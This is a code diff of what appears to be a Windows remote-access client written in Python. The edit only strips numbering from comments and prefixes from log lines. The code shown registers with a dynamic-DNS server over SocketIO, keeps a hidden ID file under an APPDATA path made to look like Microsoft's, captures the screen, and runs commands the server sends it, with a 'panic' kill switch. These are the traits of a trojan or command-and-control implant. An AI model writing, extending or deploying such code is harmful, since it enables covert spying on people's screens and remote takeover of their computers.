@@ -9,13 +9,13 @@ import subprocess
 from PIL import ImageGrab, Image
 import socketio
 
-# 1. Single Instance Enforcement via Windows Mutex
+# Single Instance Enforcement via Windows Mutex
 kernel32 = ctypes.windll.kernel32
 mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
 if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
     sys.exit(0)
 
-# 2. Server Configuration & Unique Client Identification
+# Server Configuration & Client ID
 VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")
 ID_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "run", "run.txt")
 
@@ -33,7 +33,7 @@ else:
 
 unique_user = f"{os.getenv('USERNAME')}-{unique_id}-W"
 
-# 3. SocketIO Client Initialization
+# SocketIO Client Initialization
 sio = socketio.Client(reconnection=True, reconnection_delay=2)
 
 capture_active = False
@@ -76,13 +76,13 @@ def capture_loop():
 
 @sio.event
 def connect():
-    print(f"[Client] Connected to WebSocket server as {unique_user}")
+    print(f"Connected to WebSocket server as {unique_user}")
     sio.emit("register", {"username": unique_user})
 
 
 @sio.event
 def disconnect():
-    print("[Client] Disconnected from WebSocket server")
+    print("Disconnected from WebSocket server")
 
 
 @sio.on("exec_command")
@@ -98,7 +98,7 @@ def on_exec_command(data):
     except Exception:
         decoded_cmd = cmd_raw
 
-    print(f"[Client] Executing command: {decoded_cmd}")
+    print(f"Executing command: {decoded_cmd}")
 
     if "panic" in decoded_cmd.lower():
         sys.exit(0)
